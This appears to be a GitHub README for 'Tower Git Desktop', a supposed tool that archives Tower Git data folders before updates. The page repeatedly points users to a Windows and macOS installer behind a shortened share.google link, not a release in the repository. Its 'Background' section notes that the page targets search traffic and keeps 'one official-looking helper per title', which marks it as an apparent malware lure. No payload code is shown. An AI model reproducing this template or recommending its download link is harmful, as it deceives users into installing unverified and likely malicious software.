![Tower Git Desktop](assets/hero.png)

# Tower Git Desktop

*Keep the Tower Git data folder tidy before an update.*

## About

This repository is **Tower Git Desktop**, a developer utility. Keep the Tower Git data folder tidy before an update.

Patches move Tower Git data paths without warning.

The CLI is the source of truth. The desktop build is optional if you do not want Python installed.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Locates Tower Git user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Tower Git is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/tyle-martinez61/tower-git-desktop

MIT license. See `LICENSE`.
